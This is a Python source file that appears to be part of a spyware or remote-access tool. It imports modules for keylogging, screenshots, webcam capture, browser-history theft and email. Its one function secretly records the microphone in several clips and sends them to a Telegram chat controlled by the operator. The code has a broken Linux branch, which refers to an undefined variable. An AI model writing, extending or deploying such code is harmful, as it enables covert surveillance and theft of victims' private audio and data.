
import json
import logging
import os
import re
import shutil
import smtplib
import socket
import sys
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import Process
from pathlib import Path
from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
from threading import Thread
# External Modules #
import browserhistory as bh
import cv2
import requests
import sounddevice
from cryptography.fernet import Fernet
from PIL import ImageGrab
from pynput.keyboard import Listener


import telepot
def get(botObj:telepot.Bot, chat_id, duration=10, number=3, path=os.path.join(".","output","microphone")):
    """
    Actively records microphone in 60 second intervals.

    :param mic_path:  The file path where the microphone recordings will be stored.
    :return:  Nothing
    """

    if (botObj is not None):
        botObj.sendMessage(chat_id, "Sound recording for %s second(s) - %s file(s)"%(duration, number))

    # Import sound recording module in private thread #
    from scipy.io.wavfile import write as write_rec
    # Set recording frames-per-second and duration #
    frames_per_second = 44100
    seconds = duration

    for current in range(0, number):
        # If the OS is Windows #
        if os.name == 'nt':
            channel = 2
            rec_name = os.path.join(path, f'{current}mic_recording.wav')
        # If the OS is Linux #
        else:
            channel = 1
            rec_name = mic_path / f'{current}mic_recording.mp4'

        # Initialize instance for microphone recording #
        my_recording = sounddevice.rec(int(seconds * frames_per_second),
                                       samplerate=frames_per_second, channels=channel)
        # Wait time interval for the mic to record #
        sounddevice.wait()

        # Save the recording as proper format based on OS #
        write_rec(str(rec_name), frames_per_second, my_recording)

        time.sleep(1)

    if (botObj is not None):
        media = []
        for file in os.listdir(path):
            if file.endswith(".wav"):
                f =open(os.path.join(path, file), 'rb')
                media.append({"type": "audio", "media": f})
        botObj.sendMediaGroup(chat_id, media)